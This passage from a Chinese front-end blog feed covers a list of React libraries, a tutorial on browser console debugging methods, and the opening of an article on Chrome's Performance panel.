/><strong>（1）Styled–Components</strong><br />styled-components 可以在 JavaScript 代码中使用 CSS 来设置 React 组件的样式。通过这个库可以自定义组件的样式，它会将给定的样式包装成一个组件，可以直接使用这个组件，也不需要组件和样式之间的映射，即创建后就是一个正常的React 组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629425277-2395fbc6-96c9-40cd-bcf3-d448d0944564.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629425277-2395fbc6-96c9-40cd-bcf3-d448d0944564.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Emotion</strong><br />Emotion 是一个高性能且灵活的 CSS-in-JS 库。基于许多其他 CSS-in-JS 库，它允许开发人员使用字符串或对象样式快速设置应用样式。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629210965-2a64670e-cd04-479b-8233-9c6e892bc8d7.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629210965-2a64670e-cd04-479b-8233-9c6e892bc8d7.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>13、数据请求</strong><br /><strong>（1）Axios</strong><br />Axios 是一个基于 promise 网络请求库，作用于node.js 和浏览器中。 它是 isomorphic 的(即同一套代码可以运行在浏览器和node.js中)。在服务端它使用原生 node.js http 模块，而在客户端 (浏览端) 则使用 XMLHttpRequests。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628850112-88db8b6d-893d-4bf6-b09d-68a59fa84656.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659628850112-88db8b6d-893d-4bf6-b09d-68a59fa84656.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React Query</strong><br />React Query 是一个适用于react hooks的请求库，它可以为任何类型的异步数据提供React状态管理功能，使React中的获取、缓存、同步和更新服务器数据变得轻而易举。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629045249-67dfcc4e-7f4c-433d-a2b3-f47f5022dda0.png?x-oss-process=image/resize,w_955,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659629045249-67dfcc4e-7f4c-433d-a2b3-f47f5022dda0.png?x-oss-process=image/resize,w_955,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>14、测试</strong><br /><strong>（1）Jest</strong><br />Jest 是由 Facebook 开发的 JavaScript 测试框架。它应该是测试 React 的首选，因为它是由 React 的发明者创建的，并且得到了 React 社区的支持和开发。它还支持 Babel、TypeScript、Node、Angular 和 Vue 以及其他 JS 框架。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624570394-2473b035-c0fe-4dd3-a2e7-4eea4737fc17.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624570394-2473b035-c0fe-4dd3-a2e7-4eea4737fc17.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React Testing Library</strong><br />React Testing Library 基于DOM Testing Library的基础上添加一些API，主要用于测试React组件。该库在使用过程并不关注组件的内部实现，而是更关注测试。该库基于react-dom和react-dom&#x2F;test-utils，是以上两者的轻量实现。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624741784-d4c6ce19-875e-4f47-9a70-f58c81b2925e.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659624741784-d4c6ce19-875e-4f47-9a70-f58c81b2925e.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）Vitest</strong><br />Vitest 是一个由 Vite 提供支持的极速单元测试框架。其和 Vite 的配置、转换器、解析器和插件保持一致、开箱即用的 TypeScript &#x2F; JSX 支持、支持 Smart 和 instant watch 模式，如同用于测试的 HMR、内置 Tinyspy 用于模拟、打标和监察等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625017469-b90d5172-7866-49e6-9b27-9d1d2744176e.png?x-oss-process=image/resize,w_951,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659625017469-b90d5172-7866-49e6-9b27-9d1d2744176e.png?x-oss-process=image/resize,w_951,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>15、自定义Hooks</strong><br /><strong>（1）Ahooks</strong><br />ahooks 是一套由阿里巴巴开源的 React Hooks 库，封装了大量好用的 Hooks。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622548861-c18e9673-9685-4dfb-a5f0-d41ee3db7857.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622548861-c18e9673-9685-4dfb-a5f0-d41ee3db7857.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Use</strong><br />React Use 是一个必不可少的 React Hooks 集合。其包含了传感器、用户界面、动画效果、副作用、生命周期、状态这六大类的Hooks。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622548858-c93d03eb-4b72-4f1b-b313-fd219482e5c9.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622548858-c93d03eb-4b72-4f1b-b313-fd219482e5c9.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）useHooks</strong><br />useHooks 是一组易于理解的 React Hook集合。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622619158-bba9fbc2-2dd9-404f-bfc6-a4ac782207cd.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622619158-bba9fbc2-2dd9-404f-bfc6-a4ac782207cd.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>16、服务端渲染</strong><br /><strong>（1）Next.js</strong><br />Next.js 是一个用于服务器渲染的通用 JavaScript Web 应用程序的小型框架，该框架基于 React、Webpack 和 Babel 构建，为该网站提供了强大的支持。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621913376-e477fa98-3c6c-4901-b91f-07f07e3baa48.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621913376-e477fa98-3c6c-4901-b91f-07f07e3baa48.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Razzle</strong><br />Razzle是类似于next.js的简单服务端框架，用于在服务端渲染 React 应用程序。比较方便的一点是无需配置。通过将一般的JavaScript应用抽象成单个的依赖，然后将框架，路由和数据提取出来。同时，Razzle 支持可插拔渲染。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622042021-e310bd26-437d-43a1-842a-93e9d266097d.png?x-oss-process=image/resize,w_955,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622042021-e310bd26-437d-43a1-842a-93e9d266097d.png?x-oss-process=image/resize,w_955,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>17、拖拽排序</strong><br /><strong>（1）React Beautiful Dnd</strong><br />react-beautiful-dnd 是一款美观且简单易用的 React 列表拖拽库。其动画效果自然，性能优秀，简洁而强大的 API，易于上手，与标准浏览器的互动性非常好。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1659622363765-7be10003-191f-407b-8468-48870f82899c.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1659622363765-7be10003-191f-407b-8468-48870f82899c.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React DnD</strong><br />React DnD是 React 和 Redux 核心作者 Dan Abramov 创造的一组React 高阶组件，可帮助我们构建复杂的拖放界面，同时保持组件解耦。它可以在应用程序的不同部分之间通过拖动传输数据，并且组件会更改其外观和应用状态以响应拖放事件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622410709-79d963e3-7d2c-4724-9cd5-c0a4c150ee33.png?x-oss-process=image/resize,w_949,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622410709-79d963e3-7d2c-4724-9cd5-c0a4c150ee33.png?x-oss-process=image/resize,w_949,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Draggable</strong><br />React-Draggable 库简单易用，将 CSS 中的 transform 应用于 React 组件，允许我们在 UI 中拖动组件。它有不同的 props 可以让你改变组件的行为，是创建直观、用户友好界面的绝佳选择。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1659622440946-bcf078ea-7c9b-4e03-b2b0-f815bf7efc52.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1659622440946-bcf078ea-7c9b-4e03-b2b0-f815bf7efc52.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>18、国际化</strong><br /><strong>（1）React Intl</strong><br />React Intl 提供了一个 React 组件和用于国际化 React Web 应用的 Mixin。它提供一个格式化日期、数字、字符串消息的描述方式。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622204634-fa5e8142-b1b3-4b07-941b-ee081a71d9c3.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622204634-fa5e8142-b1b3-4b07-941b-ee081a71d9c3.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）React-i18next</strong><br />react-i18next 是基于 i18next 的一款强大的国际化框架，可以用于 react 和 react-native 应用，是目前非常主流的国际化解决方案。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622267896-9b8a351e-3b6a-4bb6-9c9d-8b96043b1bef.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659622267896-9b8a351e-3b6a-4bb6-9c9d-8b96043b1bef.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>19、其他</strong><br /><strong>（1）Reactide</strong><br />Reactide 是首个用于 React Web 应用开发的专用 IDE 。它是一个跨平台的桌面应用程序，提供了一个自定义模拟器，不需要构建工具和服务器配置，开箱即用。 Reactide 将开发带回到打开单个文件的日子，立即在浏览器中呈现项目。 使用 Reactide，开发人员可以使用单个 React JSX 文件实现相同的简单性，同时利用 React 的强大功能。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659601981425-37c0edc9-f522-441a-b212-67215f5e92aa.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659601981425-37c0edc9-f522-441a-b212-67215f5e92aa.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（2）Gatsby</strong><br />Gatsby 是基于 React 构建的静态站点生成器，拥有丰富的插件生态，其主要目标之一是交付访问速度快速的网页，它通过利用良好的缓存、静态页面生成和基于边缘的 CDN 数据源来实现这一目标。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621812138-36b47366-46e3-4ffd-924b-02ff10f370c9.png?x-oss-process=image/resize,w_930,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621812138-36b47366-46e3-4ffd-924b-02ff10f370c9.png?x-oss-process=image/resize,w_930,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>（3）React Helmet</strong><br />React Helmet是一个HTML文档head管理工具，管理对文档头的所有更改。Helmet采用纯 HTML 标签并输出纯 HTML 标签。它非常简单，而且对 React 初学者友好。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621458775-7e031028-b8db-4dd5-bafd-937cfaa4e617.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1659621458775-7e031028-b8db-4dd5-bafd-937cfaa4e617.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>console 调试技巧</title>
      <link href="/2021/06/20/frontend/browser/debug/console-diao-shi-ji-qiao/"/>
      <url>/2021/06/20/frontend/browser/debug/console-diao-shi-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="df368884"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果统计一番前端最常用的方法，那么 console.log 一定位列其中。无论你写的是原生 JS 亦或者是 JQuery、Vue等等，调试之时，都离不开 console.log 方法。但是，console 对象中的方法不仅仅只有 log 方法。强大的 console 对象提供了大量控制台调试的相关方法，掌握这些方法可以大大方便你的调试，甚至做出一些炫酷的控制台字符画。</p><p><a name="864de167"></a></p><h3 id="基本输出"><a href="#基本输出" class="headerlink" title="基本输出"></a>基本输出</h3><p>console 对象最基础的方法毫无疑问是 log，该方法会直接在控制台上输出参数，如果输入多个参数，那么输出在控制台上的参数用空格分隔，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>);</span><br></pre></td></tr></table></figure><p>打开控制台，运行结果如下图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369005139-babaae29-8209-473d-895f-42e9c7eccb74.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369005139-babaae29-8209-473d-895f-42e9c7eccb74.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>console.log 还含有类似于 Python 的占位符功能，但是，个人认为该功能可以完全被 ES6 中的字符串模板完全替代，有兴趣的可以去了解，在此不再赘述。</p><p><a name="2da6f345"></a></p><h3 id="分类输出"><a href="#分类输出" class="headerlink" title="分类输出"></a>分类输出</h3><p>厌倦了 console.log 单调的输出？欢迎尝试 console 对象的分类输出功能。console 对象提供了 info、warn、error 方法分别输出提示、警告以及错误信息。<br />我们输入下面这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;log&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;info&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;warn&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369026448-a85fdb63-f7a5-4832-bf70-d5ed63f09ab8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369026448-a85fdb63-f7a5-4832-bf70-d5ed63f09ab8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>可以发现，warn 和 error 方法分别输出了一条警告和一条错误信息。但是，为什么 log 方法和 info 方法输出是一样的呢？<br />原因在于，我使用的是 Chrome 浏览器，在 Chrome 浏览器上，log 方法和 info 方法的表现是一样的。但是，在其他浏览器上，比如 FireFox，info 方法前面会有一个信息图标。<br />由于 info 方法的效果不明显，并且各个浏览器中效果有差异，所以一般情况下，我们使用 log 方法代替 info 方法。</p><p><a name="2fda7b0d"></a></p><h3 id="断言输出"><a href="#断言输出" class="headerlink" title="断言输出"></a>断言输出</h3><p>console 对象提供了类似于单元测试中的断言的方法：assert。该方法接收两个参数，第一个参数为断言条件，第二个参数代表断言信息。<br />同单元测试断言一样，当断言条件为 true 时，assert 无输出；只有当断言条件为 false 时，assert 方法才会在控制台中输出一条断言错误信息。<br />我们输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">assert</span>(<span class="literal">true</span>, <span class="string">&#x27;true&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">assert</span>(<span class="literal">false</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure><p>控制台如下所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1554739550794-94b609f3-1804-4015-892b-317582fe5b7f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1554739550794-94b609f3-1804-4015-892b-317582fe5b7f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="assert.png"></p><p>可以发现，控制台只输出了那一条断言条件为 false 的语句。</p><p><a name="6ec21063"></a></p><h3 id="分组输出"><a href="#分组输出" class="headerlink" title="分组输出"></a>分组输出</h3><p>当你的控制台上输出了大量信息时，控制台会显得极其杂乱，你甚至不知道某一条信息是哪条代码输出的。此时，console 对象的 group 以及 groupEnd 方法可以拯救你。<br />将部分 console 语句放入 group 与 groupEnd 之间，可以形成将这部分 console 语句划定为一组信息进行输出。其中，group 方法接收一个字符，作为分组名称，groupEnd 方法不接收参数用于结束分组。<br />输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">group</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1-1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;1-2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;1-3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">groupEnd</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">group</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2-1&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&#x27;2-2&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;2-3&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">groupEnd</span>();</span><br></pre></td></tr></table></figure><p>结果如图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369059602-5b6c8e42-b7e6-47cd-92ca-82f17c99b109.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369059602-5b6c8e42-b7e6-47cd-92ca-82f17c99b109.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>通过点击分组的箭头，可以折叠分组，方便归纳整理控制台信息，避免控制台被海量信息淹没。</p><p><a name="8756f96b"></a></p><h3 id="表格输出"><a href="#表格输出" class="headerlink" title="表格输出"></a>表格输出</h3><p>我们不仅可以将控制台信息分组输出，我们还可以将其以表格的形式输出。<br />console 的 table 方法可以将一个对象以表格的形式输出，当输入的参数不是对象时，此时，table 方法相当于 log 方法。<br />输入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">value</span>: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">b</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">value</span>: <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">table</span>(obj);</span><br></pre></td></tr></table></figure><p>控制台如图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369104176-b8364314-4b8f-4394-a319-32fcf5eb2d62.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369104176-b8364314-4b8f-4394-a319-32fcf5eb2d62.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>控制台不仅以表格形式输出了对象，还以基础输出的方式输出了对象以方便查看信息。</p><p><a name="0e0b2800"></a></p><h3 id="计次输出"><a href="#计次输出" class="headerlink" title="计次输出"></a>计次输出</h3><p>在日常开发中，有一个常见的调试需求——计算一段代码的执行次数。一般来说，我们会在这段代码中定义一个变量，每执行一次它就进行一次自增，并通过 console.log 方法输出该变量。<br />可以看出，上述的方法略显麻烦，可不可以一行代码就解决这个问题呢？当然可以！count 方法，你值得拥有。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;num&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;num&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">count</span>(<span class="string">&quot;anotherNum&quot;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369126613-bb2fcde7-e59a-4ad3-8bc0-7621ea3ac25f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369126613-bb2fcde7-e59a-4ad3-8bc0-7621ea3ac25f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>可以发现，count 方法通过输入的字符串区分不同的计数语句。</p><p><a name="5ec5f672"></a></p><h3 id="计时输出"><a href="#计时输出" class="headerlink" title="计时输出"></a>计时输出</h3><p>当测试算法性能时，我们通常使用时间复杂度来评价算法的性能，但是，时间复杂度哪里有代码执行时间来的直观呢？<br />在之前不了解 console 对象的时候，我们在算法的头尾分别获取时间戳，取时间戳的差值作为代码执行时间。很明显，这种方法太过繁琐。<br />使用 console 对象的 time 以及 timeEnd 方法可以计算出代码执行时间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">time</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>;i++) &#123;</span><br><span class="line">    sum += i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">timeEnd</span>(<span class="string">&#x27;time&#x27;</span>);</span><br></pre></td></tr></table></figure><p>结果如下图所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369146285-3964aeb0-8dea-4c22-b108-59efe8386548.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/png/272053/1551369146285-3964aeb0-8dea-4c22-b108-59efe8386548.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="9415a826"></a></p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>除了上述的方法，cnosole 方法还有很多强大的方法，比如：dir、debug、trace等，但是它们有的在 Chrome 效果不佳，有的能被 Chrome debugger 完美替代，所以，在此不再赘述。如果有兴趣，可以进一步了解。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chrome 性能监测</title>
      <link href="/2021/04/11/frontend/browser/debug/chrome-xing-neng-jian-ce/"/>
      <url>/2021/04/11/frontend/browser/debug/chrome-xing-neng-jian-ce/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>前端性能优化一直是前端工作中必不可少的一部分，但是我们如何知道哪些部分的性能有优化的空间呢？此时，Chrome 性能监测就派上用场了。</p><p>正所谓：知己知彼，百战百胜，只有确定了性能瓶颈，才能有条不紊地进行前端性能优化工作。</p><p><a name="Performance"></a></p><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><p>Performance 是 Chrome 开发者工具中的一个功能，用于记录网页从初始化到运行时的所有性能指标。</p><p>使用 Performance 之前，我们需要先打开 Chrome 的无痕模式，因为，身为开发者，Chrome 上一般都有着大量的 Chrome 插件，而 Chrome 插件会显著影响页面的性能。所以，我们需要进入无痕模式来规避 Chrome 插件对页面性能的影响。</p><p>进入无痕模式后，我们打开需要进行性能监测的网站，开启 Chrome 开发者工具，点击 Performance 选项卡，进入面板。此时的面板什么都没有，只有几个操作提示。</p><p>接下来，我们点击左上角的 Record（小圆点）按钮，Performance 进入 Record 阶段，从此刻开始，它会记录用户的交互以及这些交互对页面性能数据的影响。当交互完成后，点击 Stop 来停止 Record ，Performance 面板会展示出刚才录制的页面性能数据。如下所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237392439-f5416a63-ec9f-4a29-bee0-573cbd2810df.jpeg" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2019/jpeg/272053/1555237392439-f5416a63-ec9f-4a29-bee0-573cbd2810df.jpeg" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="performance总览.jpg"></p><p>拿到 Performance 性能报告，首先，我们先看顶部的三个数据：FPS、CPU 以及 NET。</p><ol><li>FPS：主要和动画性能有关，代表每秒帧数。图表中的绿色长条越高，说明FPS越高，用户体验越好。如果其中有红色长条，代表着这部分帧数有卡顿，需要优化。</li><li>CPU：和底部的 Summary 对应，显示了页面加载过程中，各阶段对 CPU 的占用时间，占用时间越多，代表该阶段越需要优化。在 Performance 